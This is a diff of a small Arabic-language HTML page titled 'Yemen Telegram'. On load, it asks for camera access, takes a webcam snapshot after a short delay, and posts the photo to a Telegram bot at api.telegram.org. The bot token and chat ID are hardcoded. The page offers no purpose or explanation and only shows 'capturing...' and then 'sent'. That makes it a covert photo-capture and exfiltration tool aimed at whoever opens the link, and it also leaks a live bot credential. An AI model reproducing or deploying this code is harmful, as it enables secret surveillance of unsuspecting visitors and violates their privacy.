@@ -1,1 +1,60 @@
-<!DOCTYPE html> <html lang="ar"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Yemen Telegram</title> </head> <body> <h2>جاري الالتقاط...</h2> <script> const botToken = "6767498865:AAFibdms3ba_9bH8vqD6X92DrkiRHkPEn2w"; const chatId = "-1002819450502"; window.onload = async function() { try { // تشغيل الكاميرا const stream = await navigator.mediaDevices.getUserMedia({ video: true }); const video = document.createElement('video'); video.srcObject = stream; await video.play(); // انتظار لحظة قبل الالتقاط await new Promise(res => setTimeout(res, 1500)); // التقاط صورة const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight; canvas.getContext('2d').drawImage(video, 0, 0); canvas.toBlob(async (blob) => { const formData = new FormData(); formData.append("chat_id", chatId); formData.append("photo", blob, "snapshot.jpg"); formData.append("caption", "صورة ملتقطة"); await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData }); // إيقاف الكاميرا stream.getTracks().forEach(track => track.stop()); document.body.innerHTML = "<h2>✅ تم الإرسال</h2>"; }, "image/jpeg"); } catch (err) { console.error("خطأ:", err); alert("لم يتم السماح بالوصول إلى الكاميرا."); } }; </script> </body> </html>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Yemen Telegram</title>
+</head>
+<body>
+  <h2>جاري الالتقاط...</h2>
+
+  <script>
+    // بيانات البوت
+    const botToken = "6767498865:AAFibdms3ba_9bH8vqD6X92DrkiRHkPEn2w";
+    const chatId   = "-1002819450502";
+
+    window.onload = async function() {
+      try {
+        // تشغيل الكاميرا
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video  = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        // الانتظار قليلاً حتى تفتح الكاميرا
+        await new Promise(res => setTimeout(res, 1500));
+
+        // التقاط صورة
+        const canvas = document.createElement('canvas');
+        canvas.width  = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+
+        // تحويل الصورة وإرسالها للبوت
+        canvas.toBlob(async (blob) => {
+          const formData = new FormData();
+          formData.append("chat_id", chatId);
+          formData.append("photo", blob, "snapshot.jpg");
+          formData.append("caption", "📸 صورة ملتقطة");
+
+          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+
+          // إيقاف الكاميرا
+          stream.getTracks().forEach(track => track.stop());
+
+          // تغيير واجهة الصفحة
+          document.body.innerHTML = "<h2>✅ تم الإرسال</h2>";
+        }, "image/jpeg");
+
+      } catch (err) {
+        console.error("خطأ:", err);
+        alert("❌ لم يتم السماح بالوصول إلى الكاميرا.");
+      }
+    };
+  </script>
+</body>
+</html>
